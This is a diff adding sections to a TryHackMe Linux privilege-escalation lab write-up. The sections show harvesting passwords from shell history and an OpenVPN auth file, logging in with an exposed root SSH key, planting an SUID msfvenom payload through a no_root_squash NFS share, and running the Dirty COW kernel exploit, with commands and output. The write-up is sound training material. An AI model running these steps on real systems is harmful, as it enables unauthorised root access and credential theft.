@@ -3,11 +3,9 @@ title: "TryHackMe - Linux PrivEsc"
 categories:
   - TryHackMe
 tags:
-  - linux
   - writeup
   - tryhackme
-  - hacking
-  - privesc
+  - linux privesc
 ---
 Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentials: user:password321
 
@@ -846,3 +844,317 @@ The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-e
     user@debian:~$ /usr/local/bin/suid-env2
     root@debian:~#
     ```
+
+## Passwords & Keys - History Files
+If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
+
+- View the contents of all the hidden history files in the user's home directory:
+
+    ```bash
+    user@debian:~$ cat ~/.*history | less
+    ls -al
+    cat .bash_history 
+    ls -al
+    mysql -h somehost.local -uroot -ppassword123
+    exit
+    cd /tmp
+    clear
+    ifconfig
+    netstat -antp
+    nano myvpn.ovpn 
+    ls
+    identify
+    ```
+
+    Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!
+
+- Switch to the root user, using the password:
+
+    ```bash
+    user@debian:~$ su root
+    Password: 
+    root@debian:/home/user#
+    ```
+
+- What is the full mysql command the user executed?
+
+    ```bash
+    mysql -h somehost.local -uroot -ppassword123
+    ```
+
+## Passwords & Keys - Config Files
+Config files often contain passwords in plaintext or other reversible formats.
+
+- List the contents of the user's home directory:
+
+    ```bash
+    user@debian:~$ ls /home/user
+    myvpn.ovpn  tools
+    ```
+
+- Note the presence of a myvpn.ovpn config file. View the contents of the file:
+
+    ```bash
+    user@debian:~$ cat /home/user/myvpn.ovpn
+    client
+    dev tun
+    proto udp
+    remote 10.10.10.10 1194
+    resolv-retry infinite
+    nobind
+    persist-key
+    persist-tun
+    ca ca.crt
+    tls-client
+    remote-cert-tls server
+    auth-user-pass /etc/openvpn/auth.txt
+    comp-lzo
+    verb 1
+    reneg-sec 0
+
+    user@debian:~$ cat /etc/openvpn/auth.txt
+    root
+    password123
+    ```
+
+- The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
+
+    ```bash
+    user@debian:~$ su root
+    Password: 
+    root@debian:/home/user# 
+    ```
+
+- What file did you find the root user's credentials in?
+
+    ```bash
+    /etc/openvpn/auth.txt
+    ```
+
+## Passwords & Keys - SSH Keys
+Sometimes users make backups of important files but fail to secure them with the correct permissions.
+
+- Look for hidden files & directories in the system root:
+
+    ```bash
+    user@debian:~$ ls -la /
+    total 96
+    drwxr-xr-x 22 root root  4096 Aug 25  2019 .
+    drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
+    drwxr-xr-x  2 root root  4096 Aug 25  2019 bin
+    drwxr-xr-x  3 root root  4096 May 12  2017 boot
+    drwxr-xr-x 12 root root  2820 Feb  2 05:01 dev
+    drwxr-xr-x 67 root root  4096 Feb  2 05:01 etc
+    drwxr-xr-x  3 root root  4096 May 15  2017 home
+    lrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -> boot/initrd.img-2.6.32-5-amd64
+    drwxr-xr-x 12 root root 12288 May 14  2017 lib
+    lrwxrwxrwx  1 root root     4 May 12  2017 lib64 -> /lib
+    drwx------  2 root root 16384 May 12  2017 lost+found
+    drwxr-xr-x  3 root root  4096 May 12  2017 media
+    drwxr-xr-x  2 root root  4096 Jun 11  2014 mnt
+    drwxr-xr-x  2 root root  4096 May 12  2017 opt
+    dr-xr-xr-x 97 root root     0 Feb  2 04:59 proc
+    drwx------  5 root root  4096 May 15  2020 root
+    drwxr-xr-x  2 root root  4096 May 13  2017 sbin
+    drwxr-xr-x  2 root root  4096 Jul 21  2010 selinux
+    drwxr-xr-x  2 root root  4096 May 12  2017 srv
+    drwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh
+    drwxr-xr-x 13 root root     0 Feb  2 04:59 sys
+    drwxrwxrwt  2 root root  4096 Feb  2 05:06 tmp
+    drwxr-xr-x 11 root root  4096 May 13  2017 usr
+    drwxr-xr-x 14 root root  4096 May 13  2017 var
+    lrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -> boot/vmlinuz-2.6.32-5-amd64
+    ```
+
+- Note that there appears to be a hidden directory called **.ssh**. View the contents of the directory:
+
+    ```bash
+    user@debian:~$ ls -l /.ssh
+    total 4
+    -rw-r--r-- 1 root root 1679 Aug 25  2019 root_key
+    ```
+
+    Note that there is a world-readable file called **root_key**. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.
+
+- Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
+
+    ```bash
+    ┌──(kali㉿kali)-[~]
+    └─$ chmod 600 root_key
+    ```
+
+- Use the key to login to the Debian VM as the root account (change the IP accordingly):
+
+    ```bash
+    ┌──(kali㉿kali)-[~]
+    └─$ ssh -i root_key root@10.10.225.64
+    Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+    The programs included with the Debian GNU/Linux system are free software;
+    the exact distribution terms for each program are described in the
+    individual files in /usr/share/doc/*/copyright.
+
+    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+    permitted by applicable law.
+    Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
+    root@debian:~#
+    ```
+
+## NFS
+Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+
+- Check the NFS share configuration on the Debian VM:
+
+    ```bash
+    user@debian:~$ cat /etc/exports
+    # /etc/exports: the access control list for filesystems which may be exported
+    #               to NFS clients.  See exports(5).
+    #
+    # Example for NFSv2 and NFSv3:
+    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+    #
+    # Example for NFSv4:
+    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+    #
+
+    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+    #/tmp *(rw,sync,insecure,no_subtree_check)
+    ```
+
+    Note that the `/tmp` share has root squashing disabled.
+
+- Using Kali's root user, create a mount point on your Kali box and mount the `/tmp` share (update the IP accordingly):
+
+    ```bash
+    ┌──(root💀kali)-[/home/kali]
+    └─# mkdir /tmp/nfs
+                                                                                                                                                                                
+    ┌──(root💀kali)-[/home/kali]
+    └─# mount -o rw,vers=2 10.10.225.64:/tmp /tmp/nfs
+    ```
+
+- Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):
+
+    ```bash
+    ┌──(root💀kali)-[/home/kali]
+    └─# msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+    [-] No arch selected, selecting arch: x86 from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 48 bytes
+    Final size of elf file: 132 bytes
+    Saved as: /tmp/nfs/shell.elf
+    ```
+
+- Still using Kali's root user, make the file executable and set the SUID permission:
+
+    ```bash
+    ┌──(root💀kali)-[/home/kali]
+    └─# chmod +xs /tmp/nfs/shell.elf
+    ```
+
+- Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:'
+
+    ```bash
+    user@debian:~$ /tmp/shell.elf
+    bash-4.1# whoami
+    root
+    ```
+
+- What is the name of the option that disables root squashing?
+> no_root
+
+## Kernel Exploits
+Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
+
+- Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
+
+    ```bash
+    user@debian:~$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+
+    #############################
+        Linux Exploit Suggester 2
+    #############################
+
+    Local Kernel: 2.6.32
+    Searching 72 exploits...
+
+    Possible Exploits
+    [1] american-sign-language
+        CVE-2010-4347
+        Source: http://www.securityfocus.com/bid/45408
+    [2] can_bcm
+        CVE-2010-2959
+        Source: http://www.exploit-db.com/exploits/14814
+    [3] dirty_cow
+        CVE-2016-5195
+        Source: http://www.exploit-db.com/exploits/40616
+    [4] exploit_x                                                                                                                                                              
+        CVE-2018-14665                                                                                                                                                         
+        Source: http://www.exploit-db.com/exploits/45697
+    [5] half_nelson1
+        Alt: econet       CVE-2010-3848
+        Source: http://www.exploit-db.com/exploits/17787
+    [6] half_nelson2
+        Alt: econet       CVE-2010-3850
+        Source: http://www.exploit-db.com/exploits/17787
+    [7] half_nelson3
+        Alt: econet       CVE-2010-4073
+        Source: http://www.exploit-db.com/exploits/17787
+    [8] msr
+        CVE-2013-0268
+        Source: http://www.exploit-db.com/exploits/27297
+    [9] pktcdvd
+        CVE-2010-3437
+        Source: http://www.exploit-db.com/exploits/15150
+    [10] ptrace_kmod2
+        Alt: ia32syscall,robert_you_suck       CVE-2010-3301
+        Source: http://www.exploit-db.com/exploits/15023
+    [11] rawmodePTY
+        CVE-2014-0196
+        Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
+    [12] rds
+        CVE-2010-3904
+        Source: http://www.exploit-db.com/exploits/15285
+    [13] reiserfs
+        CVE-2010-1146
+        Source: http://www.exploit-db.com/exploits/12130
+    [14] video4linux
+        CVE-2010-3081
+        Source: http://www.exploit-db.com/exploits/15024
+    ```
+
+    The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at `/home/user/tools/kernel-exploits/dirtycow/c0w.c`. It replaces the SUID file `/usr/bin/passwd` with one that spawns a shell (a backup of `/usr/bin/passwd` is made at `/tmp/bak`).
+
+- Compile the code and run it (note that it may take several minutes to complete):
+
+    ```bash
+    user@debian:~$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+    user@debian:~$ ./c0w
+                                    
+    (___)                                   
+    (o o)_____/                             
+        @@ `     \                            
+        \ ____, //usr/bin/passwd                          
+        //    //                              
+        ^^    ^^                               
+    DirtyCow root privilege escalation
+    Backing up /usr/bin/passwd to /tmp/bak
+    mmap c45a0000
+
+    madvise 0
+
+    ptrace 0
+    ```
+
+- Once the exploit completes, run /usr/bin/passwd to gain a root shell:
+
+    ```bash
+    user@debian:~$ /usr/bin/passwd
+    root@debian:/home/user#
+    ```
+
+## Privilege Escalation Scripts
+Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory: `/home/user/tools/privesc-scripts`
